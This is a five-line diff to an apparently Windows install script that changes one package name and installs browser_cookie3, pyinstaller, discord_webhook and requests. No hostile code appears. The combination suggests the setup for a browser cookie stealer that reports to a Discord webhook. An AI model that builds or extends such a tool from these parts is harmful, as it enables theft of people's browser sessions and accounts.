@@ -1,5 +1,5 @@
 echo Installing requirements..
-pip install browser-cookie3==0.13.0
+pip install browser_cookie3==0.13.0
 pip install pyinstaller==4.7
 pip install discord_webhook==0.13.0
 pip install requests
